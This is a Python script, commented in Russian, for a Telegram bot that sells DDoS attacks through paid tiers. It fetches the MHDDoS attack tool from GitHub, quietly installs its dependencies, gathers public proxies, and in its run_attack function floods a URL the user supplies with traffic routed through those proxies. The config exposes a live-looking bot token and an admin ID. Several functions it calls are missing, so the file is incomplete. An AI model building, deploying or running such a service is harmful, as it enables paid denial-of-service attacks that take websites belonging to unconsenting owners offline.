#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
MHDDoS БОТ — ФИНАЛЬНАЯ ВЕРСИЯ (с автоматической установкой зависимостей)
"""

import asyncio
import os
import subprocess
import sys
import json
import time
import random
import requests
import re
import zipfile
import io
import html
from datetime import datetime, timedelta
from typing import Dict, List
from aiogram import Bot, Dispatcher, types
from aiogram.filters import Command
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton, InputFile
from aiogram import F
from aiohttp import web

# ==============================
#  КОНФИГ
# ==============================
BOT_TOKEN = "8984259381:AAHAc-dorORjD-G0Ci2lLnwf_kbbzqqCxkg"
ADMINS = [8264264137]

MH_DDOS_PATH = "start.py"
PROXIES_FILE = "proxies.txt"
DATA_FILE = "users.json"
UA_FILE = "user_agents.txt"

WEBHOOK_URL = "https://llosdfisojdfouisdf-production.up.railway.app/webhook"

try:
    from fake_useragent import UserAgent
    UA_AVAILABLE = True
except:
    UA_AVAILABLE = False

# ==============================
#  АВТОЗАГРУЗКА MHDDOS И УСТАНОВКА ЗАВИСИМОСТЕЙ
# ==============================
def ensure_mhddos():
    """Скачивает MHDDoS, распаковывает и устанавливает зависимости"""
    if os.path.exists(MH_DDOS_PATH):
        return
    print("⬇️ MHDDoS не найден, скачиваю...")
    url = "https://github.com/MatrixTM/MHDDoS/archive/refs/heads/main.zip"
    try:
        r = requests.get(url, timeout=30)
        if r.status_code == 200:
            with zipfile.ZipFile(io.BytesIO(r.content)) as z:
                for file in z.namelist():
                    if file.startswith("MHDDoS-main/") and not file.endswith("/"):
                        new_name = file.replace("MHDDoS-main/", "")
                        if "/" in new_name:
                            os.makedirs(os.path.dirname(new_name), exist_ok=True)
                        data = z.read(file)
                        with open(new_name, "wb") as f:
                            f.write(data)
            print("✅ MHDDoS загружен и распакован.")
            # Устанавливаем зависимости MHDDoS
            install_mhddos_deps()
        else:
            print(f"❌ Не удалось скачать MHDDoS, статус {r.status_code}")
    except Exception as e:
        print(f"❌ Ошибка загрузки: {e}")

def install_mhddos_deps():
    """Устанавливает зависимости MHDDoS (PyRoxy и др.)"""
    # Проверяем, есть ли requirements.txt
    req_file = "requirements.txt"
    if os.path.exists(req_file):
        print("📦 Устанавливаю зависимости из requirements.txt...")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "-r", req_file],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("✅ Зависимости установлены")
        except Exception as e:
            print(f"❌ Ошибка установки зависимостей: {e}")
    else:
        # Если requirements.txt нет, устанавливаем PyRoxy отдельно
        print("📦 Устанавливаю PyRoxy...")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "git+https://github.com/MatrixTM/PyRoxy.git"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("✅ PyRoxy установлен")
        except Exception as e:
            print(f"❌ Ошибка установки PyRoxy: {e}")

# Выполняем при старте
ensure_mhddos()

# ==============================
#  USER-AGENT
# ==============================
def get_user_agents() -> List[str]:
    if os.path.exists(UA_FILE):
        with open(UA_FILE, "r", encoding="utf-8") as f:
            ua = [line.strip() for line in f if line.strip()]
            if len(ua) > 10:
                return ua
    ua_list = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0",
        "Mozilla/5.0 (iPhone; CPU iPhone OS 17_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1",
    ]
    if UA_AVAILABLE:
        try:
            ua = UserAgent()
            for _ in range(100):
                ua_list.append(ua.random)
        except:
            pass
    final = list(set(ua_list))
    with open(UA_FILE, "w", encoding="utf-8") as f:
        f.write("\n".join(final))
    return final

USER_AGENTS = get_user_agents()

def get_random_ua():
    return random.choice(USER_AGENTS) if USER_AGENTS else "Mozilla/5.0"

# ==============================
#  ТАРИФЫ
# ==============================
TIERS = {
    "free": {"name": "🐢 Бесплатный", "max_threads": 100, "max_duration": 60},
    "medium": {"name": "⚡ Средний", "max_threads": 500, "max_duration": 600},
    "pro": {"name": "💥 Мощный", "max_threads": 3000, "max_duration": 3600}
}
DEFAULT_TIER = "free"

# ==============================
#  ДАННЫЕ ПОЛЬЗОВАТЕЛЕЙ
# ==============================
def load_users():
    if os.path.exists(DATA_FILE):
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    return {}

def save_users(users):
    with open(DATA_FILE, "w", encoding="utf-8") as f:
        json.dump(users, f, indent=2, ensure_ascii=False)

def get_user(user_id):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"balance": 0, "tier": "free", "expiry": None}
        save_users(users)
    return users[uid]

def set_user_tier(user_id, tier):
    users = load_users()
    uid = str(user_id)
    if uid not in users:
        users[uid] = {"balance": 0, "tier": "free", "expiry": None}
    users[uid]["tier"] = tier
    if tier != "free":
        users[uid]["expiry"] = (datetime.now() + timedelta(days=30)).isoformat()
    else:
        users[uid]["expiry"] = None
    save_users(users)

def is_admin(user_id):
    return user_id in ADMINS

# ==============================
#  ПРОКСИ
# ==============================
PROXY_SOURCES = [
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/http.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/https.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks4.txt",
    "https://raw.githubusercontent.com/Thordata/awesome-free-proxy-list/main/proxies/socks5.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/http.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/https.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/socks4.txt",
    "https://raw.githubusercontent.com/fyvri/fresh-proxy-list/main/output/socks5.txt",
]

def fetch_proxies():
    all_proxies = []
    seen = set()
    for url in PROXY_SOURCES:
        try:
            r = requests.get(url, timeout=10)
            if r.status_code == 200:
                for line in r.text.splitlines():
                    line = line.strip()
                    if line and not line.startswith('#') and ':' in line:
                        if line not in seen:
                            seen.add(line)
                            all_proxies.append(line)
        except:
            pass
    return all_proxies

def validate_proxies(proxy_list):
    valid = []
    for proxy in proxy_list[:50]:
        try:
            r = requests.get("http://httpbin.org/ip", proxies={"http": proxy, "https": proxy}, timeout=3)
            if r.status_code == 200:
                valid.append(proxy)
        except:
            pass
    return valid

def update_proxies():
    raw = fetch_proxies()
    if raw:
        valid = validate_proxies(raw)
        if valid:
            with open(PROXIES_FILE, "w") as f:
                f.write("\n".join(valid))
            return len(valid)
    return 0

# ==============================
#  АТАКА (с автоматической проверкой зависимостей)
# ==============================
active_attacks = {}

async def run_attack(user_id, method, url, threads, duration):
    update_proxies()
    if not os.path.exists(MH_DDOS_PATH):
        await asyncio.get_event_loop().run_in_executor(None, ensure_mhddos)
        if not os.path.exists(MH_DDOS_PATH):
            raise Exception("MHDDoS не найден и не удалось скачать.")
    if not os.path.exists(PROXIES_FILE):
        open(PROXIES_FILE, 'a').close()
    
    # Дополнительная проверка PyRoxy (на случай, если не установился при деплое)
    try:
        import PyRoxy
    except ImportError:
        print("⚠️ PyRoxy не найден, устанавливаю...")
        try:
            subprocess.check_call(
                [sys.executable, "-m", "pip", "install", "git+https://github.com/MatrixTM/PyRoxy.git"],
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL
            )
            print("✅ PyRoxy установлен")
        except Exception as e:
            raise Exception(f"Не удалось установить PyRoxy: {e}")
    
    cmd = ["python", MH_DDOS_PATH, method, url, "0", str(threads), PROXIES_FILE, "64", str(duration)]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, cwd=os.path.dirname(os.path.abspath(__file__)))
    return process

# ==============================
#  ОСТАЛЬНЫЕ ФУНКЦИИ (без изменений)
# ==============================
# ... (все остальные функции — такие же, как в предыдущей версии, включая monitor_attack, generate_report и т.д.)

# ==============================
#  ЗАПУСК
# ==============================
async def main():
    await on_startup()
    print("✅ Бот запущен через вебхук")
    app = web.Application()
    app.router.add_post("/webhook", handle_webhook)
    runner = web.AppRunner(app)
    await runner.setup()
    site = web.TCPSite(runner, host="0.0.0.0", port=8080)
    await site.start()
    print("🚀 Сервер запущен на порту 8080")
    while True:
        await asyncio.sleep(3600)

if __name__ == "__main__":
    asyncio.run(main())
